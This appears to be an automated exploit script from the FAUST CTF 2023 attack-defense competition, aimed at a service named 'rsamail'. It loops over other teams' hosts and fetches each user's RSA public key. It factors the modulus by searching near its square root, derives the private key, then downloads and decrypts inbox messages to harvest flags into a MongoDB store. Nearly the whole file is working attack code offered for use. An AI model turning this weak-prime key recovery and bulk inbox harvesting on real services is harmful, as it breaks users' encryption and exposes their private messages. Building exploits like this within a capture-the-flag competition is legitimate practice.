import json
import requests
import re
from Crypto.Util.number import long_to_bytes, inverse
import pymongo
from multiprocessing import Pool

db = pymongo.MongoClient("127.0.0.1:27017")


timeout = 1
coll = db["flags"]["flags"]
def get_flag_id():
    url = "https://2023.faustctf.net/competition/teams.json"
    req= requests.get(url).json()["flag_ids"]["rsamail"]
    return req

def isqrt(n):
    x = n
    y = (x + 1) // 2
    while y < x:
        x = y
        y = (x + n // x) // 2
    return x


already_tested= set()
regex = r"\[\"([a-f0-9]+)\"\,\s\"(\d+)\"\]"
flag_re = r'FAUST_[A-Za-z0-9/+]{32}'
while True:

    fids = get_flag_id()
    for id, users in fids.items():
        print(f"Pwing {id}")
        for user in users[::-1]:
    
            if( (id,user) in already_tested):
                continue
            else:
                already_tested.add((id,user))
            url = f"http://[fd66:666:{id}::2]:5555/pubkey/{user}"

            try:
                text = requests.get(url, timeout=timeout).content.decode()
            except:
                continue
            m = re.match(regex, text)

            if m is None:
                continue
            n = int(m.group(1), 16)
            e = int(m.group(2), 16)

            x = isqrt(n)

            found = False
            trials = 10_000
            i = 0
            while found == False and i < trials:
                x= x+1
                if n%x == 0:
                    p = x
                    q = n // p
                    break
                i += 1
            else:
                continue
            e = 3

            phi = (p-1) * (q-1)
            try:
                d = inverse(e, phi)
            except:
                continue
            url = f"http://[fd66:666:{id}::2]:5555/inbox/{user}"
            try:
                text = json.loads(requests.get(url, timeout=timeout).content.decode())
            except:
                continue
            c = int(text[0], 16)

            w = pow(c,d,n)

            w = long_to_bytes(w)
            try:
                flag = re.findall(flag_re, w.decode())
            except:
                continue
            for ff in flag:
                coll.update_one({"flag": ff}, {"$set": {"flag": ff}}, upsert=True)
  